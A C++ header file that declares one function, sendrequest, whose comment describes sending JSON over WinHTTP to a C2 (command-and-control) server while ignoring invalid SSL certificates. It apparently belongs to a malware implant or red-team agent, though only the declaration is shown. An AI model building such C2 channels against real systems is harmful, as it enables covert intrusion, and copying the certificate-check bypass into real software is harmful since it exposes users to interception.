#ifndef SENDREQUEST_H
#define SENDREQUEST_H

#include "../Helpers/json.hpp"

#pragma comment(lib, "winhttp.lib")


/// <summary>
/// This function is used for sending and receving JSON data. It parses URL, set request
/// timeout, ignore invalid SSL errors, set content-type header to JSON and finally send
/// the data to C2, it then receives the response and returns it as a narrow string.
/// </summary>
/// <param name="fullUrl"></param>
/// <param name="jsonData"></param>
/// <returns></returns>
std::string sendrequest(const std::wstring& fullUrl, const nlohmann::json& jsonData);

#endif
